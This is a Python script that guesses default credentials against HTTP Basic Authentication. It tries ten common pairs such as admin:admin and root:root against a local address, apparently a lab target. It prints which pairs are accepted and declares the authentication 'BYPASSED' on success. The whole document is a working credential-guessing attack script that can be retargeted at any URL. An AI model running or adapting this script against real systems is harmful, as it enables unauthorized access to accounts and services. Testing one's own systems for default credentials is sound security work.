import requests
from requests.auth import HTTPBasicAuth

# Target information
target_url = "http://127.0.0.1:32785"

# Common credentials to test
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "password123"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("test", "test123"),
    ("root", "root"),
    ("root", "password"),
    ("guest", "guest")
]

print(f"[*] Testing HTTP Basic Authentication on {target_url}")
print("=" * 60)

successful_credentials = []

for username, password in credentials:
    try:
        # Attempt authentication
        response = requests.get(target_url, auth=HTTPBasicAuth(username, password), timeout=10)
        
        # Record results
        print(f"\n[+] Testing: {username}:{password}")
        print(f"    Status Code: {response.status_code}")
        
        if response.status_code == 200:
            print(f"    Result: ACCESS GRANTED ✓")
            successful_credentials.append((username, password))
        elif response.status_code == 401:
            print(f"    Result: ACCESS DENIED ✗")
        else:
            print(f"    Result: UNEXPECTED STATUS")
            
    except requests.exceptions.Timeout:
        print(f"\n[-] Timeout testing {username}:{password}")
    except requests.exceptions.ConnectionError:
        print(f"\n[-] Connection error testing {username}:{password}")

# Summary
print("\n" + "=" * 60)
print("[*] SUMMARY")
print("=" * 60)
print(f"\nTotal credentials tested: {len(credentials)}")
print(f"Successful credentials: {len(successful_credentials)}")

if successful_credentials:
    print("\n[+] SUCCESSFUL CREDENTIALS:")
    for username, password in successful_credentials:
        print(f"    - {username}:{password}")
else:
    print("\n[-] No successful credentials found.")

if successful_credentials:
    print(f"\n[*] Basic Auth BYPASSED with {len(successful_credentials)} credential(s)")
else:
    print(f"\n[*] Basic Auth NOT bypassed - all credentials rejected")
